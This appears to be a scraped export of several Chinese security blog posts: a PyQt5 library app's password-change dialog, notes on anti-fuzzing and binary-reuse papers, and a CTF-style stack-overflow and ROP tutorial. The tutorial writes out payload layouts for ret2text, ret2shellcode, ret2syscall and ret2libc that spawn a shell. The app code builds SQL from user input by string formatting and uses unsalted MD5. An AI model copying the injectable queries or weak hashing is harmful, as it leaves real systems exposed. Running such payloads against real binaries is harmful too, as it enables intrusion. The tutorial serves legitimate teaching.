returnDialog.return_book_success_signal.connect(self.storageView.searchButtonClicked) returnDialog.show() returnDialog.exec_() def myBookStatusClicked(self): self.layout.removeWidget(self.storageView) sip.delete(self.storageView) self.storageView = BookStorageViewer() self.borrowStatusView = BorrowStatusViewer(self.StudentId) self.layout.addWidget(self.borrowStatusView) self.allBookButton.setEnabled(True) self.myBookStatus.setEnabled(False) return def allBookButtonClicked(self): self.layout.removeWidget(self.borrowStatusView) sip.delete(self.borrowStatusView) self.borrowStatusView = BorrowStatusViewer(self.StudentId) self.storageView = BookStorageViewer() self.layout.addWidget(self.storageView) self.allBookButton.setEnabled(False) self.myBookStatus.setEnabled(True) returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = StudentHome(&quot;PB15000135&quot;) mainMindow.show() sys.exit(app.exec_())实现效果#修改密码功能#修改密码功能使用菜单栏QAction点击启动分析#修改密码，主要需要用户输入学号， 原密码，新密码，确认密码实现代码逻辑如下：确认学号与原密码对应，否则报错输入新密码与确认密码 ，如果相同，则md5加密后放入数据库中注意设置输入校验使用对话框实现代码实现#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstyleimport timefrom PyQt5.QtSql import *import hashlibclass changePasswordDialog(QDialog): def __init__(self, parent=None): super(changePasswordDialog, self).__init__(parent) self.setWindowModality(Qt.WindowModal) self.setWindowTitle(&quot;修改密码&quot;) self.setUpUI() def setUpUI(self): self.resize(300, 280) self.layout = QFormLayout() self.setLayout(self.layout) self.titlelabel = QLabel(&quot; 修改密码&quot;) self.studentIdLabel = QLabel(&quot;学 号：&quot;) # self.studentNameLabel=QLabel(&quot;姓 名：&quot;) self.oldPasswordLabel = QLabel(&quot;旧 密 码：&quot;) self.passwordLabel = QLabel(&quot;新 密 码：&quot;) self.confirmPasswordLabel = QLabel(&quot;确认密码：&quot;) self.studentIdEdit = QLineEdit() # self.studentNameEdit=QLineEdit() self.oldPasswordEdit = QLineEdit() self.passwordEdit = QLineEdit() self.confirmPasswordEdit = QLineEdit() self.changePasswordButton = QPushButton(&quot;确认修改&quot;) self.changePasswordButton.setFixedWidth(140) self.changePasswordButton.setFixedHeight(32) self.layout.addRow(&quot;&quot;, self.titlelabel) self.layout.addRow(self.studentIdLabel, self.studentIdEdit) # self.layout.addRow(self.studentNameLabel,self.studentNameEdit) self.layout.addRow(self.oldPasswordLabel, self.oldPasswordEdit) self.layout.addRow(self.passwordLabel, self.passwordEdit) self.layout.addRow(self.confirmPasswordLabel, self.confirmPasswordEdit) self.layout.addRow(&quot;&quot;, self.changePasswordButton) font = QFont() font.setPixelSize(20) self.titlelabel.setFont(font) font.setPixelSize(16) self.studentIdLabel.setFont(font) # self.studentNameLabel.setFont(font) self.oldPasswordLabel.setFont(font) self.passwordLabel.setFont(font) self.confirmPasswordLabel.setFont(font) font.setPixelSize(16) self.studentIdEdit.setFont(font) self.changePasswordButton.setFont(font) # self.studentNameEdit.setFont(font) font.setPixelSize(10) self.oldPasswordEdit.setFont(font) self.passwordEdit.setFont(font) self.confirmPasswordEdit.setFont(font) self.titlelabel.setMargin(8) self.layout.setVerticalSpacing(10) # 设置长度 self.studentIdEdit.setMaxLength(10) self.oldPasswordEdit.setMaxLength(16) self.passwordEdit.setMaxLength(16) self.confirmPasswordEdit.setMaxLength(16) # 设置密码掩膜 self.oldPasswordEdit.setEchoMode(QLineEdit.Password) self.passwordEdit.setEchoMode(QLineEdit.Password) self.confirmPasswordEdit.setEchoMode(QLineEdit.Password) # 设置校验 reg = QRegExp(&quot;PB[0~9]{8}&quot;) pValidator = QRegExpValidator(self) pValidator.setRegExp(reg) self.studentIdEdit.setValidator(pValidator) reg = QRegExp(&quot;[a-zA-z0-9]+$&quot;) pValidator.setRegExp(reg) self.oldPasswordEdit.setValidator(pValidator) self.passwordEdit.setValidator(pValidator) self.confirmPasswordEdit.setValidator(pValidator) # 设置信号与槽 self.changePasswordButton.clicked.connect(self.changePasswordButtonClicked) def changePasswordButtonClicked(self): studentId = self.studentIdEdit.text() oldPassword = self.oldPasswordEdit.text() password = self.passwordEdit.text() confirmPassword = self.confirmPasswordEdit.text() if (studentId == &quot;&quot; or oldPassword == &quot;&quot; or password == &quot;&quot; or confirmPassword == &quot;&quot;): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;输入不可为空，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) return db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() sql = &quot;SELECT * FROM User WHERE StudentId='%s'&quot; % studentId query.exec_(sql) # 如果用户不存在 if (not query.next()): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;该用户不存在，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) self.studentIdEdit.clear() return # 如果密码错误 hl = hashlib.md5() hl.update(oldPassword.encode(encoding='utf-8')) md5password = hl.hexdigest() sql = &quot;SELECT * FROM User WHERE Password='%s' AND StudentId='%s'&quot; %(md5password,studentId) query.exec_(sql) if (not query.next()): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;原密码输入错误,请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) self.oldPasswordEdit.clear() return # 密码与确认密码不同 if(password!=confirmPassword): print(QMessageBox.warning(self,&quot;警告&quot;,&quot;两次输入密码不同,请确认输入&quot;,QMessageBox.Yes,QMessageBox.Yes)) self.passwordEdit.clear() self.confirmPasswordEdit.clear() return # 修改密码 hl = hashlib.md5() hl.update(password.encode(encoding='utf-8')) md5password = hl.hexdigest() sql=&quot;UPDATE User SET Password='%s' WHERE StudentId='%s'&quot;%(md5password,studentId) query.exec_(sql) db.commit() QMessageBox.information(self,&quot;提醒&quot;,&quot;修改密码成功，请登录系统!&quot;,QMessageBox.Yes,QMessageBox.Yes) self.close() returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = changePasswordDialog() mainMindow.show() sys.exit(app.exec_())实现效果#最后附上链接#项目地址：github仓库链接","link":"/77aca64.html"},{"title":"FUZZIFICATION: Anti-Fuzzing Techniques(USENIX 2019)","text":"fuzz作为一种自动化技术，在安全人员手中能够用来发现漏洞，但同时也让hacker能够通过fuzz寻找0day进行攻击。为了解决这个问题，本文提出了FUZZIFICATION技术。在实际应用中，对外发布使用FUZZIFICATION处理过的二进制文件，提高hacker fuzz的难度和成本，而对内，由于安全人员拥有未处理过的二进制，使得安全人员能够在hacker fuzz出漏洞前更早的发现漏洞并进行修补。Introduction#anti-fuzzing的目的类似于二进制中的混淆技术，为了提高攻击者的攻击难度。攻击者虽然能够对FUZZIFICATION处理后的二进制文件进行fuzz，但需要耗费更多的经历(内存、算力、时间等)。而安全人员能够利用这个时间差在攻击者之前寻找漏洞并进行修补。有效的anti-fuzzing技术应该满足以下三个条件：能够有效阻止现有的fuzz工具，在固定时间内发现更少的错误受保护的程序在正常状态下仍然能够正常运行保护技术不应该被轻易识别并通过patch从程序中删除现有的技术无法同时满足这三个目标：software obfuscation techniques：通过混淆阻止fuzz存在以下问题混淆给正常执行带来很大的开销，例如ollvm混淆使执行速度降低了约25倍混淆只能减慢单次fuzz的速度，但无法在路径上做文章software diversification：软件多样化能缓解攻击但无法隐藏根本漏洞本文提出了三种FUZZIFICATION 技术，保护程序抵抗fuzz，分别是SpeedBump（注入delay），BrachTrap（插入jump）和AntiHybrid（阻止其他技术在fuzzing领域的应用），并实现了这三种防御机制。为了评估FUZZIFICATION技术，作者在LAVA-M数据集和9个常用程序上做了实验，使用4个流行fuzzer（AFL、HonggFuzz、VUzzer和QSym）对受保护和未保护程序进行实验。贡献：阐明了anti-fuzzing方案的新研究方向。提出并实现了三种有效的FUZZIFICATION方法。降低fuzzing速度，隐藏路径覆盖范围、阻止动态污点分析和符号执行。使用流行的fuzzer和通用基准进行评估。从真实二进制文件中发现的bug减少了93％，从LAVA-M数据集中发现的bug减少了67.5％，在保持用户指定的开销预算的同时，覆盖率也降低了70.3％。且数据流和控制流分析技术无法轻易移除FUZZIFICATION技术。 源代码：https://github.com/sslab-gatech/fuzzificationBackground and Problem#Fuzzing techniques#为了在fuzz的时候速度更快，一般会从加速单次执行的速度或者减少执行的次数考虑单次执行加速：定制的硬件、并行fuzzing覆盖率：收集每次执行的代码覆盖率，并优先fuzz触发新分支的输入。一般采用基本块或者分支来统计代码覆盖率启发式：使用污点分析等方法帮助fuzzFUZZIFICATION Problem#问题场景：程序开发人员希望由自己或者受信方公开漏洞，而不是黑客，而Anti-Fuzzing技术能够阻碍恶意人员的fuzzing，实现这一目标FUZZIFICATION流程：对外公开使用FUZZIFICATION技术编译生成受保护的二进制文件对内使用常规方法编译生成正常的二进制文件通过两者fuzz的差距，完成目标攻击方设定：有限的资源只有受FUZZIFICATION保护的二进制文件FUZZIFICATION技术目标：**Effective：**与原始二进制相比，能够在同样的资源条件下，有效减少发现的bug数量**Generic：**对大多数fuzzer适用**Efficient：**对常规适用影响小**Robust：**能够抵抗试图从二进制文件中删除保护的方法下列已有的方法都无法同时满足这四个要求Design Overview#针对上述分析，本文提出了三种FUZZIFICATION技术：**SpeedBump：**在二进制中插入延迟原语，在fuzz时会频繁使用，而正常时不怎么使用**BranchTrap：**构造对输入敏感的分支，使得基于覆盖率的fuzzer多走弯路，同时有意使得频繁路径冲突，从而达到让fuzzer无法识别触发新路径的输入**AntiHybird：**将显式数据流转换为隐式数据流，防止通过污点分析进行数据流跟踪，插入大量伪造符号在符号执行过程中触发路径爆炸SpeedBump#**原理：**fuzzer在进行fuzz的时候，会进入类如错误处理的路径，而在正常使用时这些路径并不会经常被执行。所以在这些cold path中注入延迟原语，可以大大降低fuzz执行的速度，且不会对正常执行产生大影响。方法：正常编译二进制文件，对二进制文件进行测试，找到cold path通过生成基本块的频率曲线，识别cold path确认注入延迟的cold path数目和延迟大小，使正常执行时开销在预算之内重复操作，调整延迟大小如果简单的注入sleep等语句，那么可以十分方便的进行去除，所以作者设计了基于CSmith的原语，使用算数运算并和原始代码关联BranchTrap#**原理：**对于使用覆盖率的fuzzer，通过插入大量对输入敏感的分支，使得fuzzer陷入对这些分支的分析中，误导fuzzer构造大量条件分支和间接跳转，这些条件分支与输入的字节相关，因此对输入敏感。为了使fuzzer关注假分支，作者考虑了以下四个方面假分支足够多注入的分支和路径对常规运行带来的开销影响小路径需要与输入相关无法被攻击者轻易去除方法：CFG Distortion： 注入跳转表，使用输入作为索引，并且使用类似于ROP的方法，使用gadget优点1：与输入相关联，所以fuzzer不会忽略这些分支优点2：轻量级的解析跳转对正常情况下影响小优点3：基于ROP方法，增加了去除的难度**Saturating Fuzzing State：**使fuzzing状态饱和，在很少访问的分支中加入大量确定性分支AntiHybird#原理： 模糊测试的弱点符号执行和污点分析需要大量资源符号执行容易受到路径爆炸的问题污点分析难以跟踪隐式的数据依赖方法：将显示数据流转换为隐式数据流，对抗污点分析注入多个代码块，有意触发路径爆炸，对抗符号执行Evaluation#都在论文里，效果可以说是十分不错个人看法#论文中提出的三种方法都是针对于当前fuzzer的策略和原理一一提出的方案，短时间内应该很难有更好更全面的的Idea产生了，被UNSNIX接收也是实至名归。可以说FUZZIFICATION打开了一个新的研究领域。同时对比于二进制中的混淆和反混淆，可以预见到：如果FUZZIFICATION持续受到研究人员关注的话，那么DE FUZZIFICATION 也会成为研究或者实践中的热点问题之一。例如可以想策略去除FUZZFICATION的设置，或者在fuzzer中加入新的启发式策略，从而减少FUZZIFICATION对fuzzer的影响。","link":"/14b4d99.html"},{"title":"栈溢出与ROP分析与利用","text":"基础知识#栈溢出与ROP#栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。栈溢出漏洞就是由于栈溢出而导致的漏洞。在程序执行过程中，常使用栈帧记录程序执行过程中的状态，在栈帧中保存着返回地址，当利用栈溢出漏洞修改函数返回地址跳转到非预期地址执行时，就产生了ROP攻击，又称返回导向编程。程序调用栈#栈帧是记录程序执行过程中状态的结构。在cdecl调用约定中，当程序P调用Q时，会出现以下行为：P将Q需要的参数保存到栈或者约定寄存器中，再将Q的返回地址存入栈；Q在栈中保存当前esp/rsp寄存器中的值，再将ebp/rbp寄存器中值赋值给esp/rsp寄存器形成栈帧；Q申请的局部变量需要的栈空间；当Q执行完毕，使用栈中保存的esp/rsp值恢复给esp/rsp寄存器；从栈中取出返回地址，跳转回P中继续执行；正是因为存在程序调用栈，当出现栈溢出漏洞时，我们能够对返回地址进行劫持，修改程序默认执行路径，达到自己的目的。常见保护机制#在栈溢出漏洞攻防博弈中，程序的保护机制十分重要。对白客来说，通过添加程序保护机制，能够提高漏洞利用的门槛，一定程度上防止程序漏洞被利用；而对于黑客来说，熟悉程序保护机制，能够在漏洞利用过程中少走弯路，提高漏洞利用的效率。图2.1所示是使用checksec工具检查linux系统中sh二进制文件的结果。可以看到它启用了RELRO、Canary、NX、PIE和FORTIFY保护。其中Canary、NX和PIE这三种在实际利用中较为常见且有用。其中Canary 和NX在Windows系统中也有类似的保护机制。图2.1 linux下sh中存在的保护机制NX与DEP#NX是No eXcute的缩写，意为不可执行保护，在Windows系统中为DEP保护。其根本原理如图2.2所示，黑客需要利用漏洞劫持返回地址到某个位置执行，而这一保护将区域置为不可执行，当跳转到该区域内时，检测到异常，触发异常处理并退出程序，使得劫持失效。图2.2 NX/DEP原理Canary与GS#Linux下的Canary保护对应Windows下的GS保护。利用栈溢出是线性连续的覆盖栈内的数据这一特性，在返回地址前插入一个随机的不可预测值，并在函数返回时检查是否被修改，如果被修改，则一定产生了栈溢出，此时会退出程序执行。如图2.3所示，是x86下的Canary保护时栈内布局示意图。图2.3 Canary/GS保护栈布局图PIE与ASLR#PIE是编译过程中的选项，是位置独立的可执行区域的意思。当操作系统开启ASLR（内存地址随机化）时，会打乱二进制文件加载的基址，使得返回地址随机，即使动态调试中EXP通过，但远程攻击时也会由于地址随机化机制失效。操作系统中ASLR存在3个可选项，如下：值为0：无随机化，堆栈地址每次都相同值为1：随机化出了堆基址以外的所有加载基址值为2：随机化所有加载基址（包括堆）ROP分析与利用#ROP，又称返回导向编程，利用程序指令集中存在的ret指令，改变指令流的执行顺序。其利用条件为：程序存在溢出且能够控制返回地址；可以找到满足条件的gadgets和gadgets地址。基本的分类如下：ret2text、ret2shellcode、ret2syscall、ret2libc。注：以下分析与利用都为32位程序，示例二进制文件来源于ctfwiki。ret2text#ret2text是指返回到程序中text段已有的代码中执行。分析与利用步骤： 以附件中的ret2text程序为例checksec查看保护结果如图3.1.1所示，能够看到没有开启保护。图3.1.1 checksec查看ret2text结果2. 使用IDA查看ret2text main函数如图3.1.2所示，能够看到存在栈溢出漏洞，由于gets函数未判断读入长度，能使用读入的字符串写入s覆盖到main函数返回地址。图3.1.2 ret2text main函数3. 在secure函数中寻找到system(“/bin/sh”)，如图3.1.3图3.1.3 secure函数4. 通过输入对栈进行布局。由于未开启保护，我们能直接找到调用system(“/bin/sh”)的指令地址system_binsh_addr，因此我们通过栈溢出布置栈布局如图3.1.4所示，栈溢出首先需要覆盖旧的ebp值，进而覆盖到返回地址，将其修改为system_binsh_addr的地址即可。图3.1.4 ret2text栈布局5. 最后我们需要确定填入的padding长度，使得正好溢出到我们需要的位置，通过gdb和其插件动态调试可以获得，如图3.1.5调试信息可知，padding长度为108。图3.1.5 gdb调试padding长度6. 确定输入，由以上信息我们就能构造最后的输入，为108*’A’+p32(0xdeadbeaf)+p32(system_binsh_addr)。ret2shellcode#shellcode是能让黑客获得shell的16进制机器码，当text段没有能获取shell的代码时，就需要我们自己想办法将shellcode放入内存中了。各种条件下的shellcode可以参考shellstorm获得。图3.2.1 16进制shellcode图3.2.1是一段16进制shellcode，对应的汇编代码如图3.2.2 所示。可以看到是将字符串/bin/sh\\x00存入，再通过系统调用好获取shell。图3.2.2 shellcode汇编代码分析与利用步骤：以附件中的ret2shellcode文件为例checksec查看程序保护机制，如图3.2.3所示，没有开启。图3.2.3 ret2shellcode 保护机制2. 使用IDA查看main函数如图3.2.4所示，可以看到gets存在栈溢出问题，并且将s内容放到了.bss段的buf2内。由于.bss段具有可执行权限，所以我们可以将shellcode输入存在buf2中，再修改返回地址到buf2处执行。图3.2.4 ret2shellcode main函数3. 通过输入对栈布局如图3.2.5所示，由于存在拷贝，会将shellcode拷贝到buf2，再跳转到buf2执行shellcode即可。图3.2.5 ret2shellcode栈布局4. 同ret2text一样确定padding长度为108。构造输入为shellcode+(108-len(shellcode))+p32(0xdeadbeaf)+p32(buf2)即可。ret2syscall#ret2syscall是指返回到系统调用执行。例如执行execve(‘/bin/sh’,0,0)获取shell。通过系统调用号，来调用系统函数，不使用libc中的函数，更加底层。在利用过程中，首先通过栈溢出和gadgets将寄存器置为需要的值，再使用int 0x80进行系统调用。图3.3.1所示是execve(‘/bin/sh‘,0,0)对应汇编代码。可以看到从栈中取出了参数放入对应的寄存器，寄存器edx置0，ecx置0，ebx置为’/bin/sh’地址，在eax中存入系统调用号0xb。图3.3.1 execve获取shell的汇编代码分析与利用步骤：以附件中的retsyscall程序为例checksec查看保护如图3.3.2 所示，未开启保护。图3.3.2 ret2syscall保护机制2. IDA打开查看main函数如图3.3.3所示，存在栈溢出。图3.3.3 ret2syscall main函数3. 通过ROPgadgets工具能找到修改寄存器值，int 0x80，/bin/sh的gadgets地址如图3.3.4所示。图3.3.4 ret2syscall gadgets4. 通过gadgets和栈溢出，就能构造栈布局进行利用了，如图3.3.5所示。图3.3.5 ret2syscall 栈布局当函数返回时，首先会利用两个pop的gadgets及栈中数据，修改eax、ebx、ecx、edx寄存器的值，最后执行int 0x80，就能获得shell了。padding长度依旧为108，构造输入为108*’A’+p32(0xdeadbeaf)+p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(binsh_address)+p32(int_0x80_addr)即可。ret2libc#ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，会选择执行 system(&quot;/bin/sh&quot;)，故而需要知道 system 函数的地址。可以分为以下三种情况：类型1：有”/bin/sh”，有system函数类型2：没有”/bin/sh”，有system函数类型3：没有”/bin/sh”，没有system函数类型1：有”/bin/sh”，有system函数#分析与利用步骤：以附件中的ret2libc1文件为例checksec查看ret2libc1保护如图3.4.1所示，开启了NX保护。图3.4.1 ret2libc1 保护机制2. IDA查看main函数，可以看到存在栈溢出漏洞，如图3.4.2所示。图3.4.2 ret2libc1 main函数3. 使用ROPgadget工具，在程序中能够找到/bin/sh字符串地址binsh_address，且在程序的plt表中能够找到system函数地址system_plt_address，即为第一类。通过栈溢出布局，由于我们知道字符串地址和system在plt表中地址，所以不需要泄露libc基址。如图3.4.3所示，覆盖返回地址为system_plt_address，并放入参数为/bin/sh地址即可。同前，padding长度为108，构造输入为:’A’*108+p32(0xdeadbeaf)+p32(system_plt_address)+p32(0xdeadbeaf)+p32(binsh_address)图3.4.3 ret2libc1 栈布局类型2：没有”/bin/sh”，有system函数#分析与利用步骤：以附件中ret2libc2文件为例checksec查看保护机制，如图3.4.4所示，只开启了NX保护图3.4.4 ret2libc2 保护机制2. IDA打开查看main函数，如图3.4.5所示，同样存在栈溢出漏洞。与ret2libc1不同的是，ret2libc2中不存在/bin/sh字符串，但是我们能在.bss段找到一个全局的buf2数组，长度为0x64。图3.4.5 ret2libc2 main函数3. 由于plt表中存在gets函数地址gets_plt和system函数地址system_plt，.bss段buf2数组地址为buf2_addr。因此利用可以分为两步，首先构造执行gets(buf2_addr)将/bin/sh字符串写入全局buf2中，再执行system(buf2_addr)达到目的。经过上述分析，可以对栈布局如图3.4.6所示，在这里要注意，由于在程序执行中gets有一个参数，因此需要将其pop出去才能继续执行。图3.4.6 ret2libc2 栈布局5. 同样padding长度仍然为108，最后可以构造输入如下：108*’A’+p32(0xdeadbeaf)+p32(gets_plt)+p32(pop_ebx_ret)+p32(buf2_addr)+p32(system_plt)+p32(0xdeadbeaf)+p32(buf2_addr)类型3：没有”/bin/sh”，没有system函数#这一类的漏洞利用思路如下：system函数属于libc.so，在libc.so中的相对偏移是固定的即使开启了ASRL保护，也不会改变加载地址的低12位可以通过GOT表泄露已执行过的libc.so中的函数的地址通过泄露的低12位找到libc.so版本，得到system函数和/bin/sh地址ROP利用分析与利用步骤：以附件中的ret2libc3文件为例1．checksec查看ret2libc3保护机制，如图3.4.7所示，只开启了NX保护图3.4.7 ret2libc3保护机制2. IDA打开查看main函数，如图3.4.8所示，存在栈溢出。存在gets和puts两个libc.so中的函数图3.4.8 ret2libc3 main函数3. 根据之前所说的利用思路，可以想到以下利用步骤：第一次ROP：利用puts函数泄露__libc_start_main函数地址通过低12位查找libc.so版本得到实际的system函数和/bin/sh地址第二次ROP：执行system(“/bin/sh”)这里我们需要让main函数执行两次，这样才能进行两次ROP第一次ROP栈布局如图3.4.9所示，返回时，先调用puts函数输出__libc_start_main函数地址，然后会进入第二次main函数的执行，得到了第二次ROP的机会图3.4.9 ret2libc3 第一次ROP栈布局5. 通过泄露的__libc_start_main函数地址，可以得到system函数地址和/bin/sh地址，从而第二次ROP栈布局如图3.4.10所示，执行system(“/bin/sh”) 。图3.4.10 ret2libc3 第二次ROP栈布局在通过低12位查询libc.so版本时可以利用[libc版本数据库](https://github.com/niklasb/libc-database)， 以及其对于python的查询封装[LibcSearcher](https://github.com/lieanu/LibcSearcher)。","link":"/1fd25de4.html"},{"title":"B2SFinder——Detecting Open-Source Software Reuse in COTS Software(ASE 2019)","text":"B2SFinder: Detecting Open-Source Software Reuse in COTS Software#B2SFinder 主要是为了解决闭源二进制软件中对复用开源组件检测的问题，由于复用了开源组件，当开源组件发现存在漏洞时，复用它的二进制软件也会存在漏洞，即OSS复用漏洞。PS：我挂了个n作Abstract#虽然此前也有一些工作致力于研究二进制和源代码的匹配方法，并能进行大规模的分析，但他们只支持一些简单的特征。在他们的研究中只能近似的衡量OSS复用，忽略了项目中的代码结构。为了解决这个问题，B2SFinder通过对二进制文件和源代码中的7种特征进行提取，并对7种特征使用三种匹配方法和两种重要性加权方法，计算匹配分数。通过这种方法，我们对1000个流行的二进制软件中的21991个二进制文件和2189个开源库的复用进行了评估。平均每个二进制文件耗时53.85秒。我们也讨论了如何使用B2SFinder检测OSS复用漏洞。Introduction#对于OSS复用检测，一般来说可以分为两种方法：软件二进制 v.s. 开源组件二进制软件二进制 v.s. 开源组件源码对于第一种方法，主要存在以下两个问题：从搜集到的2189个开源库中发现，只有1/4左右能自动编译二进制相似性匹配效率低，难以规模化对于第二种方法，此前也已有一些研究见下表因此，我们能够提出以下问题：选取哪些特征，且能对抗编译优化？如何精确计算特征之间的相似性？我们如何利用开源软件的代码结构来提高复用识别能力？B2SFinder的工作流如下：整体上的特征分类以及算法如下：同时，我们也将复用分为以下三类：单一复用、部分复用和嵌套复用，其中前两类是真正的复用。实验结果：1000个闭源软件中的21991个二进制文件 v.s. 2189个开源库达到了92.3%的检测精度以及88.5%的召回率，并且速度更快在结果中发现63.4%的闭源软件复用了开源库，并且4.6%的开源库被复用了十次以上，平均每个库存在54.7个已知CVE。Motivation#以两个真实例子为例：Foxit Reader和ssleay32.dll复用opensslLibopenjp2-7.dll复用OpenJPEGMatching Score Calculation#从上图中可以看到，FoxitReader.exe和Openssl的export部分没有共同的函数名，并且只有19.7%的字符串常量为共有字符串。因此我们能够知道BAT和OSSPolice这两种方法在这一例子中效果是不理想的。但是我们能够在data段和rdata段以及text段找到一些其他的特征能够匹配上，最终，我们为B2SFinder选取了图中的7种特征。有了特征，那么二进制和源码特征之间的特征匹配就是一个新的问题，特别是一些特征在编译的时候，会被轻微的修改对于七种特征，我们共使用了3种特征匹配算法字符串型（导出函数、字符串数组和导出函数）：使用字符串之间的精确匹配并使用倒排索引方式检索。数字数组型（全局常量数组、全局枚举数组）：使用二进制片段检索的匹配控制流型（if else、switch case）:基于语义等价的匹配注意匹配算法并不等同于匹配分数计算，对此，我们使用了两种分数计算方法二进制信息熵TF-IDFReuse Type Identification#分为单一复用和部分复用两类在大多数情况下，匹配分数高判断为复用是正确的，这是最简单的一种，单一复用实验中也发现了部分复用的情况，例如libssl（ssleay），只复用了openssl中7.6%的源代码文件，因此匹配分数并不高为了识别部分复用的情况，考虑开源项目的代码结构是十分重要的。我们首先将开源项目分解为库模块，并分析编译过程获得库模块和源码的关系，例如openssl编译出来会有libssl和libcrypto两个库模块，称为开源库之间的包含关系。Design#Selecting Code Feature#特征选取只要考虑两个影响：1、特征在源码和二进制上都存在；2、编译过程对特征改变不大。Matching Code Features#将7种特征分为 字符串型、数字型和控制流型，并使用不同的算法进行匹配算法：字符串型：完全匹配。数字型：全局整数/枚举数组作为可搜索的连续比特流存储在二进制文件的数据段中，因此，采用将其编码后直接在.data和.radata中寻找的方法尽心匹配。控制流型：基于语义的匹配。例如，对于switch case来说，源码中为[􏰁{0},{9},{16},{17},{20}􏰂]，但二进制中提取到的jump table是􏰁{0},{9},{16},{17},{20},{1,2,3,4,5,6,7,8,10, 11,12,13,14,15,18,19}􏰂，他们是语义等价的。对于if else特征来说，二进制提取的是最长的公共子序列[0x1,0x80,0x800,0x10000,0x200000,0x10]，但源码中为[0x80,0x800,0x10000, 0x200000]，他们也是匹配的，匹配长度为4Determining the Importance-Weights of Feature Instances#对于一些常见的特征，例如base64的表等，由于其特殊性不够，因此对判断复用哪个库的参考不够大，为了衡量特殊性，我们采用了类TF-IDF的S-IDF方法For a string-typed feature, we use the number of its substrings, including URLs and copyright information (among others).For an integer-typed feature, the entropy for its bitstream is used.For a control-flow-typed feature, the length of its constant sequence is used.Computing the Specificity Weights of Bitstreams as EntrophyS-IDF for Computing Frequency WeightsComputing Matching Scores#Identifying Reuse Types#识别部分复用：识别递归复用：IMPLEMENTATION#个人感觉#说一下在最近的分析和改进过程中，发现的一些尚需改进的问题：在一些库中，由于存在大量static函数，一旦优化会产生内联，影响匹配效果。在项目实现上，If else特征部分存在问题，由于比较的是cmp命令，因此在二进制特征提取时，循环中的判断常量也会提取出来，而源码仅提取if else中常量，虽然在比较时采用了最长匹配方法，但实际上仍不够理想。进一步改进可能得先识别循环，从二进制特征中将循环的cmp去除。","link":"/157adce2.html"},{"title":"The Art, Science, and Engineering of Fuzzing(TSE 2019)","text":"Abstract#Fuzzing三大优点：部署简单、门槛低、已有的大量经验证明了它的有效性。前人研究已经很多了，本文主要是做了一个系统的梳理blabla套话，目的是系统地探索模型模糊器各个阶段的设计决策，使我们的fuzzing设计更加行之有效。Introduction#对于hacker来说，fuzzing可以用来进行渗透测试和编写exp，而白帽则想利用fuzzing在被hacker攻击前找到漏洞所在。此前已经有很多成功的研究和经典的fuzzing案例了，但不行的是，fuzzing好像遇到了瓶颈。后面的话没用了，大意就是不同论文表意不一致云云等原因搞的fuzzing领域的研究有点乱了。所以，本文需要对前面的所有fuzzing研究进行提炼和升华。章节安排：第2节统一fuzzing术语和核心fuzzing框架，3-7节讲fuzzing每个阶段，调查相关文献，解释设计选择，讨论重要的权衡，并强调许多了不起的工程努力，有助于使现代fuzzing有效地完成其任务。Systemization, Taxonomy, and Test Programs#fuzzing &amp; fuzzing testing#Fuzzing：对可能的输入进行采样，得到对应的输出，类似于x-&gt;f(x)Fuzzi testing: 目标是为了寻找bug和漏洞的fuzzingFuzzer：进行fuzz testing的程序Fuzz Campaign：有一定安全策略的运行一个fuzzerBug Oracle：待检测的样本Fuzz Configuration：fuzz的算法和策略，例如种子如何生成等Paper Selection Criteria#选了哪些会议的文章云云Fuzz Testing Algorithm#模糊测试的算法目的是：在有限的时间，一定的约束条件下找到有限的bugs算法可以分为两个部分：Preprocess部分和 n轮的循环，循环包含五个部分（但在实际中有的可以不要）：schedule、inputgen、inputeval、confupdate、continue，从名字上可以很显然的看出来都是在做什么。一次循环在本文中称为fuzz iteration，简单理解就相当于编译里面的一个pass吧。一次inputeval称为fuzz run。$\\text{PREPROCESS}(\\mathbb{C}) \\rightarrow \\mathbb{C}$ ：根据用户的fuzzing configuration 进行一些可能的修改和获取一些fuzz中需要信息，比如插装，样本运行时间等$\\text { SCHEDULE (} \\mathbb{C}, \\left.t_{\\text {elapsed }}, t_{\\text {limit }}\\right) \\rightarrow \\text { conf }$ ：根据当前时间和截止时间从当前的fuzzing configure里选取一个待测configure$\\text { INPUTGEN (conf) } \\rightarrow \\text { tcs }$ ：根据configure生成待测用例$\\text { Inpureval (conf, }\\left. \\text { tcs, } O_{\\text {bug }}\\right) \\rightarrow \\mathbb{B}^{\\prime} , execinfos$ : 以生成用例和configure，并嵌入bug oracle（检查是否为bug）输入，得到bug和执行信息$\\text { CONFUPDATE (} \\mathbb{C}, conf, execinfos) \\rightarrow \\mathbb{C}$ ：更新策略$\\text { CONTINUE }(\\mathbb{C}) \\rightarrow{\\text { True, False }}$ ：判断是否退出Taxonomy of Fuzzers#黑盒、白盒、灰盒Fuzzer Genealogy and 